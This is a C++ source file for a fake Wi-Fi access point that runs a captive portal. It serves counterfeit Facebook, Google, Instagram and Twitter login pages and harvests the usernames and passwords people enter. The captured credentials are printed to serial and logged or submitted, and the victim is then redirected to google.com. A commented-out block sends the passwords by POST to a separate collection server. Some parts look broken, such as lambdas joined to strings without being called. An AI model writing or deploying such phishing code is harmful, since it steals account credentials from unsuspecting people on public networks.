/**
 * @file FakeAPlib.cpp
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief
 * @version 0.1
 * @date 2024-12-08
 * 
 * @copyright Copyright (c) 2024
 * 
 */

#include "FakeAPlib.h"



FakeAP::FakeAP()
	: WebServerManager (new SDCardManager(), SERVER_PORT)
{
}

FakeAP::FakeAP(const uint8_t& port)
	: WebServerManager (new SDCardManager(), port)
{
}

void FakeAP::handleSubmit()
{
	//variables para almacenar temporalmente las entradas del usuario
	String credentials = "uid: " + m_server->arg("username");
	//String password
	credentials.concat("\npsw: " + m_server->arg("password"));

	//se imprime por consola los valores de las entradas
	Serial.println("Facebook id: "+ m_server->arg("username"));
	Serial.println("Password: "+ m_server->arg("password"));

	if (submitCredentials(m_server->arg("platform"), m_server->arg("username"), m_server->arg("password")))
	{
		m_sdManager->logEvent("Credentials sent and stored correctly");
#if (WITH_SUCCESS_MESSAGE)
		Serial.println(SUCCES_SAVE_CREDENTIALS);
#endif
	}
	m_server->sendHeader("Location", "http://www.google.com");
	m_server->send(302, "text/plain", "Redirecting...");

	Serial.print("There are currently ");
	Serial.print(WiFi.softAPgetStationNum());
	Serial.print(" hosts connected.\n");
}


void FakeAP::handleLogin()
{
	if (m_server->method() == HTTP_GET)
	{
		/*
		auto platform = [this] () -> Platform_t {
			String str = m_server->arg("platform");

			if 		(str == "facebook")  return FACEBOOK;
			else if (str == "google") 	 return GOOGLE;
			else if (str == "instagram") return INSTAGRAM;
			else if (str == "twitter") 	 return TWITTER;
		};
		*/

		if (getLoginPage(m_server->arg("platform"))) {
			m_server->send(200, "text/html", _pageContent);
		} else {
			m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
		}
	}
}


bool FakeAP::initialize(const String &AP_SSID, const String &AP_PSW, const String &WIFI_SSID, const String &WIFI_PSW)
{
	if (!m_sdManager->initialize())
	{
#if (WITH_ERROR_TYPE)
		Serial.println(ERROR_SD_NOT_INIT);
#endif
		return 0;
	}

	if (!setAccessPoint(AP_SSID, AP_PSW))
	{
		m_sdManager->logEvent("Failed to start access point: " + AP_SSID);
		return 0;
	}
	else
	{
		m_sdManager->logEvent("Acces point initialized correctly: " + AP_SSID);
	}

	if (WIFI_PSW != NULL)
	{
		!setWifiStation(WIFI_SSID, WIFI_PSW) ? 
			m_sdManager->logEvent("Failed to connect to: " + WIFI_SSID) :
			m_sdManager->logEvent("Connected to: " + WIFI_SSID +
									"\nIP address: " + WiFi.localIP().toString());
	}


	AP_PSW == NULL ? startCaptiveServer() : this->start();
	m_sdManager->logEvent("Server started");
	return 1;
}


void FakeAP::printFilesContent()
{
	if (m_indexPage!="\0") Serial.println(m_sdManager->readFile(m_indexPage));
	if (m_exitPage!="\0") Serial.println(m_sdManager->readFile(m_exitPage));
	if (m_indexPage!="\0") Serial.println(m_sdManager->readFile(LOG_FILE));
}


void FakeAP::checkState()
{
	if (!m_sdManager->isCardInit())
	{
#if (WITH_ERROR_TYPE)
		Serial.println(ERROR_SD_CARD_READ);
#endif
		return;
	}
	
	Serial.println("Files path: ");
	Serial.println("Authentication page file: " +
					m_indexPage + ": "+ m_sdManager->getFileSystem().exists(m_indexPage));
	Serial.println("Thanks page file: " +
					m_exitPage + ": "+ m_sdManager->getFileSystem().exists(m_exitPage));
	Serial.println("Admin page file: " +
					m_adminPage + ": "+ m_sdManager->getFileSystem().exists(m_adminPage));
	Serial.println("Data file: " +
					m_datafile + ": "+ m_sdManager->getFileSystem().exists(m_datafile));
	Serial.println("Log file: " +
					String(LOG_FILE) + ": " + m_sdManager->getFileSystem().exists(LOG_FILE));

}


void FakeAP::startCaptiveServer()
{
	setupCaptivePortal();
	m_server->on("/", HTTP_GET, [this] () { handleRoot(); });
	m_server->on("/login", HTTP_GET, [this] () { handleLogin(); });
#if (WITH_SUCCESS_MESSAGE)
	Serial.println(SUCCESS_APSERVER_INIT);
#endif
	setServerIP(WiFi.gatewayIP());
}

/*
//void FakeAP::setServerIP(const IPAddress& IP) { *_serverIP = IP; }


bool FakeAP::setWifiStation(const String &wifissid, const String &wifipsw, const IPAddress& apIp)
{
	Serial.printf("Connectando a %s", wifissid.c_str());
	// Serial.print(wifissid);
	wifipsw != NULL ? WiFi.begin(wifissid, wifipsw) : WiFi.begin(wifissid);


	unsigned long timeout = millis();
	while (WiFi.status() != WL_CONNECTED)
	{
		if ((millis() - timeout) > TIME_OUT_LIMIT)
			return 0;
		delay(500);
		Serial.print(".");
	}

	Serial.println();
#if (WITH_SUCCESS_MESSAGE)
	Serial.printf(SUCCESS_WIFISTA_CONECT, wifissid.c_str());
#endif
	Serial.print("IP address: ");
	Serial.println(WiFi.localIP());

	m_sdManager->logEvent("connected to network " + wifissid);
	m_sdManager->logEvent("IP address: " + WiFi.localIP().toString());

	return 1;
}


bool FakeAP::setAccessPoint (const String &ssid, const String &psw)
{
	Serial.println("Configurando el punto de acceso.....");

	// se crea un punto de acceso con el nombre declarado más arriba
	if (psw == NULL)
	{
		if (!WiFi.softAP(ssid)) // está función accepta un segundo parametro opcional que será la contraseña del wifi
		{
#if (WITH_ERROR_TYPE)
			log_e(ERROR_WIFIAP_CREATE);
#endif
			return 0;
		}
	}
	else
	{
		if (!WiFi.softAP(ssid, psw))
		{
#if (WITH_ERROR_TYPE)
			log_e(ERROR_WIFIAP_CREATE);
#endif
			return 0;
		}
	}

	// imprimir por pantalla la dirección IP de la red
#if (WITH_SUCCESS_MESSAGE)
	Serial.println(SUCCESS_WIFIAP_INIT);
#endif
	Serial.print("Access point IP address: ");
	Serial.println(WiFi.softAPIP());
	m_sdManager->logEvent("Access point initialized");
	return 1;
}

bool FakeAP::getLoginPage(Platform_t platform)
{
	//WiFiClient* client = new WiFiClient();
	
	if (_client->connect(*_serverIP, 80))
	{
		String url = "/get-login-page?platform=" + [platform] () {
			switch (platform)
			{
			case FACEBOOK:	return "facebook";
			case GOOGLE:	return "google";
			case INSTAGRAM: return "instagram";
			case TWITTER:	return "twitter";
			}
		};

		_client->print(String("GET ") + url + " HTTP/1.1\r\n" +
			"Host: "+ *_serverIP.toString() +"\r\n" +
			"Connection: close\r\n\r\n"
			);

		while(_client->connected() && !_client->available()) delay(1);

		while(_client->available())
		{
			String line = _client->readStringUntil('\n');
			if(line == "\r") break;
		}

		String pageContent = _client->readString();
		_client->stop();

		//delete _client;
		return 1;
	}

	//delete _client;
	return 0;	
}


bool FakeAP::sendCredentialsToServer(Platform_t platform, const String& username, const String& password)
{
	//WiFiClient* client = new WiFiClient();
	if (_client->connect(*_serverIP, 80))
	{
		String postData = "platform=" + [platform] () {
			switch (platform)
			{
				case FACEBOOK:	return "facebook";
				case GOOGLE:	return "google";
				case INSTAGRAM: return "instagram";
				case TWITTER:	return "twitter";
			}
		} + "&username=" + urlencode(username) + 
			"&password=" + urlencode(password);
		
		_client->println("POST /store_credentials HTTP/1.1");
		_client->println("Host: " + serverIP.toString());
		_client->println("Content-Type: application/x-www-form-urlencoded");
		_client->println("Content-Length: " + String(postData.length()));
		_client->println();
		_client->println(postData);
		
		while (_client->connected()) {
			String line = _client->readStringUntil('\n');
			if (line == "\r") break;
		}
		_client->stop();

		return 1;
	}

	//delete _client;
	return 0;
}
*/